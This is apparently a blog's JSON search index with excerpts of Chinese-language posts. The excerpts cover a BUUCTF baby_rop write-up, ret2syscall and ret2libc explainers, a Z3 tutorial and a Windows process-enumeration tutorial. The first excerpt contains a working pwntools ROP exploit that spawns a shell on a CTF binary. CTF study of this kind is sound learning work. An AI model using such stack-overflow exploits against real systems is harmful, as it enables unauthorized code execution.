
[
  
  
  {
    "objectID": "1745160795",
    "permalink": "/post/buuctf-pwn/",
    "title": "BUUCTF Pwn",
    
    "content": " [HarekazeCTF2019]baby_rop babyrop\n分析 拖入IDA,查看main汇编代码 push rbp mov rbp, rsp sub rsp, 10h ; 为堆栈开辟0x10的空间 mov edi, offset command ; \u0026#34;echo -n \\\u0026#34;What\u0026#39;s your name? \\\u0026#34;\u0026#34; call _system lea rax, [rbp+var_10] ; 缓冲区开始写入位置 mov rsi, rax mov edi, offset p__s ; \u0026#34;%s\u0026#34; mov eax, 0 call ___isoc99_scanf ; 对于scanf(\u0026#34;%s\u0026#34;, buf)这个调用,格式化字符串\u0026#39;%s\u0026#39;存储在rdi,写入地址buf存储在rsi lea rax, [rbp+var_10] mov rsi, rax mov edi, offset format ; \u0026#34;Welcome to the Pwn World, %s!\\n\u0026#34; mov eax, 0 call _printf mov eax, 0 leave retn shift+F12查看字符串可以找到有\u0026rsquo;/bin/sh\u0026rsquo;,地址为0x601048 再找到system的调用地址(call _system)为0x4005E3 将binsh的地址pop给rdi,再调用system 先用ROPgadget找到pop rdi;ret的gadget地址为0x400683 构造payload\nsys_addr = 0x4005E3 pop_rdi_ret = 0x400683 binsh_addr = 0x601048 payload = b\u0026#39;a\u0026#39; * (0x10 + 8) + p64(pop_rdi_ret) + p64(binsh_addr) + p64(sys_addr) exp from pwn import * context.arch = \u0026#39;amd64\u0026#39; r = process(\u0026#39;./babyrop\u0026#39;) sys_addr = 0x4005E3 pop_rdi_ret = 0x400683 binsh_addr = 0x601048 # payload = b\u0026#39;a\u0026#39; * (0x10 + 8) + p64(pop_rdi_ret) + p64(binsh_addr) + p64(sys_addr) payload = flat([ b\u0026#39;a\u0026#39; * (0x10 + 8), pop_rdi_ret, binsh_addr, sys_addr ]) r.sendline(payload) r.interactive() ",
    
    "date": "2025-04-20 22:53:15",
    "updated": "2025-04-20 22:53:15"
  }
  
  , 
  {
    "objectID": "1745071614",
    "permalink": "/post/ret2syscall/",
    "title": "Ret2syscall",
    
    "content": " 前置知识 假设有以下程序\n#include \u0026amp;lt;stdio.h\u0026amp;gt; char shellcode[0x100] = \u0026amp;#34;hello world\u0026amp;#34;; my_puts(){ write(1, shellcode, 0x100); } int main(){ my_puts(); return 0; } 代码很简单,就是输出字符串\u0026amp;quot;hello world\u0026amp;quot; 但这一串代码在操作系统层面如何实现?\nflowchart LR A[\u0026#34;my_puts()\u0026#34;] --\u0026gt; B[\u0026#34;write()\u0026#34;] --\u0026gt; C[\u0026#34;sys_write()\u0026#34;] --\u0026gt; D[\u0026#34;标准输出\u0026#34;] my_puts()调用了动态链接库libc.so中的write()函数 write(1,\u0026amp;amp;\u0026amp;ldquo;hello world\u0026amp;rdquo;,12) write()将传入参数包装为汇编代码[eax = 4;ebx = 1;ecx = \u0026amp;amp;\u0026amp;quot;hello world\u0026amp;quot;;edx = 12;] + int 0x80; write()函数其实就是对write系统调用的封装 执行完成后才进入了内核kernel中的sys_write()函数 sys_write()函数会将字符串\u0026amp;quot;hello world\u0026amp;quot;写入到标准输出设备中\n什么是系统调用 系统调用是操作系统提供给用户态程序调用的接口，它是操作系统内核与用户态程序之间的接口，它提供了系统调用的入口，用户态程序通过系统调用与内核进行交互。 本质上时一些内核函数代码(一段指令),以规范的方式驱动硬件 x86通过int 0x80指令实现系统调用,amd64通过syscall指令实现系统调用 什么是libc.so 这是一个动态链接库，它包含了系统调用的实现，如open(),read(),write()等等,libc.so随着系统版本更新也会进行更新 操作系统如何调用不同版本的libc的同一个函数呢? 这里可以类比Windows系统创建的快捷方式,无论软件版本怎么变化,快捷方式都指向同一个文件,当快捷方式被点击时,系统会自动调用对应的程序 system()函数 有了上面的基础,可以知道system()其实是对execve()系统调用的封装,execve()可以执行外部可执行文件,system()可以执行 …",
    
    "date": "2025-04-19 22:06:54",
    "updated": "2025-04-19 22:06:54"
  }
  
  , 
  {
    "objectID": "1745043208",
    "permalink": "/post/ret2libc/",
    "title": "Ret2libc(未完成)",
    
    "content": " 前置知识 GOT表和PLT表 GOT: Global Offset Table, 全局偏移表，包含所有需要动态链接的外部函数的地址(在第一次执行后) PLT: Procedure Link Table, 过程链接表，包含调用外部函数的跳转指令(跳转到GOT表中)，以及初始化外部调用指令(用于链接器动态绑定dl_runtime_resolve) 延迟绑定机制 在 Linux 下，动态链接采用“懒绑定”（lazy binding）策略：编译器将对外部函数（如 foo）的调用编译进 PLT（Procedure Linkage Table） 中的伪代码，而函数真正的地址保存在 GOT（Global Offset Table） 中。首次调用时，通过 PLT0 跳入动态链接器执行符号解析（即 _dl_runtime_resolve），并将解析结果回写到 GOT 条目；后续调用则直接通过 GOT 跳转到实际函数地址，省去额外解析开销。\n动态链接过程 以调用system为例\n首次调用 flowchart LR A[\u0026#34;call system\u0026#34;] --\u0026gt; B[\u0026#34;system@plt\u0026#34;] B --\u0026gt; C[\u0026#34;system@got\u0026#34;] C --\u0026gt; D[\u0026#34;glibc中的system函数地址\u0026#34;] D --\u0026gt;|\u0026#34;存储地址\u0026#34;| C D --\u0026gt; E[\u0026#34;调用system\u0026#34;] 后续调用 flowchart LR A[\u0026#34;call system\u0026#34;] --\u0026gt; B[\u0026#34;system@plt\u0026#34;] B --\u0026gt; C[\u0026#34;system@got\u0026#34;] --\u0026gt; D[\u0026#34;调用system\u0026#34;] 由于.got中已经有了system的地址，所以后续调用时直接从.got中取地址即可，而不需要再去.got.plt中寻找。\n漏洞利用原理 通过栈溢出返回system函数的真实地址，执行/bin/sh命令获取shell 现在面临两个问题\n如何获取system函数的真实地址？ /bin/sh命令的地址如何获取？ system 函数属于 libc，而 libc.so 动态链接库中的函数之间相对偏移是固定的 即使程序有 ASLR 保护，也只是针对于地址中间位进行随机，最低的 12 位并不会发生改变 函数的真实地址 = 函数的偏移 + libc.so中的基址 可以划分为以下步骤:\n填充无用数据覆盖缓冲区 调用puts等函数,泄露已执行函数的真实地址 通过真 …",
    
    "date": "2025-04-19 14:13:28",
    "updated": "2025-04-19 14:13:28"
  }
  
  , 
  {
    "objectID": "1744885519",
    "permalink": "/post/z3%E7%BA%A6%E6%9D%9F%E6%B1%82%E8%A7%A3/",
    "title": "Z3约束求解",
    
    "content": " Z3约束求解 Z3是微软开源的开源软件，可以用来进行数学规划、逻辑推理、符号执行等问题的求解 常用于离散数学，逻辑学，计算机科学等领域 可以用pip安装，命令如下：\npip install z3-solver 函数介绍与使用 数据类型 数据类型 示例 解释 Bool x = Bool(\u0026amp;lsquo;x\u0026amp;rsquo;) 创建一个布尔变量x Bools x, y, z = Bools(\u0026amp;lsquo;x y z\u0026amp;rsquo;) 创建三个布尔变量x,y,z,以此类推,后面的Ints,Reals,BitVecs等都可以用这种方式创建 BitVec x = BitVec(\u0026amp;lsquo;x\u0026amp;rsquo;, 8) 创建一个8位的二进制向量变量x Int x = Int(\u0026amp;lsquo;x\u0026amp;rsquo;) 创建一个整数变量x Real x = Real(\u0026amp;lsquo;x\u0026amp;rsquo;) 创建一个实数变量x 常用函数 函数 功能 And(a, b) 逻辑与，返回a和b的逻辑与,表示同时满足a和b Or(a, b) 逻辑或，返回a和b的逻辑或,表示满足a或b Not(a) 逻辑非，返回a的逻辑非,表示不满足a Xor(a, b) 逻辑异或，返回a和b的逻辑异或,表示满足a或b，但不同时满足 If(a, b, c) 条件选择，返回a和b的条件选择，表示满足a时返回b，否则返回c Distinct(a, b, c) 不同，返回a、b、c的不同关系，表示a、b、c中没有相同的值 Sum(a, b, c) 求和，返回a、b、c的求和，表示a、b、c的和 Implies(a, b) 蕴含，返回a和b的蕴含关系，表示a成立那b必然成立，否则无所谓 PbEq([(x, 1), (y, 2), (z, 3)] , n) 伪布尔约束,x,y,z为布尔变量,1,2,3为权重,n为目标值，表示满足x*1+y*2+z*3=n 函数详解 PbEq 用于表示多个布尔变量中恰好有几个为真 s.add(PbEq([(x, 1), (y, 2), (z, 3)], 6)) # 约束条件是x*1+y*2+z*3=6 这里约束的表达式是 变量真值 * 权重 = 目标值 当所有权重为1时，表示多个目标只有一个成立 s.add(PbEq([(x, 1), (y, 1), (z, 1)], 1)) 表示条件x,y,z …",
    
    "date": "2025-04-17 18:25:19",
    "updated": "2025-04-17 18:25:19"
  }
  
  , 
  {
    "objectID": "1744781683",
    "permalink": "/post/c++%E8%BF%9B%E7%A8%8B%E9%81%8D%E5%8E%86/",
    "title": "C++进程遍历",
    
    "content": " 遍历进程 获取系统快照 CreateToolhelp32Snapshot 函数原型 HANDLE WINAPI CreateToolhelp32Snapshot( DWORD dwFlags, DWORD th32ProcessID ); 参数 dwFlags 描述 TH32CS_INHERIT 进程的创建者可以访问进程的子进程 TH32CS_SNAPALL 在快照中包含系统中的所有进程和线程 TH32CS_SNAPHEAPLIST 在快照中包含在th32ProcessID中指定的进程的所有的堆 TH32CS_SNAPMODULE 在快照中包含在th32ProcessID中指定的进程的所有的模块 TH32CS_SNAPPROCESS 在快照中包含系统中所有的进程 TH32CS_SNAPTHREAD 在快照中包含系统中所有的线程 返回值 如果成功，则返回一个进程快照的句柄；如果失败，则返回INVALID_HANDLE_VALUE\n举例 int main() { HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0); //核心函数 if(hSnapshot == INVALID_HANDLE_VALUE) { _tprintf(_T(\u0026amp;#34;CreateToolhelp32Snapshot error: %u\\n\u0026amp;#34;), GetLastError()); /* _tprintf无法输出中文，需要使用 #include \u0026amp;lt;locale.h\u0026amp;gt; setlocale(LC_ALL, \u0026amp;#34;\u0026amp;#34;); //设置本地化 */ return 0; } } 遍历进程信息 在调用 CreateToolhelp32Snapshot 创建系统快照后，首先需要用 Process32First 函数获取快照中的第一个进程信息 然后用 Process32Next 函数依次获取快照中的下一个进程信息，直到没有更多的进程信息为止。\nProcess32First和Process32Next 函数原型 BOOL WINAPI Process32First( HANDLE hSnapshot, LPPROCESSENTRY32 lppe ); BOOL WINAPI Process32Next( …",
    
    "date": "2025-04-16 13:34:43",
    "updated": "2025-04-16 13:34:43"
  }
  
]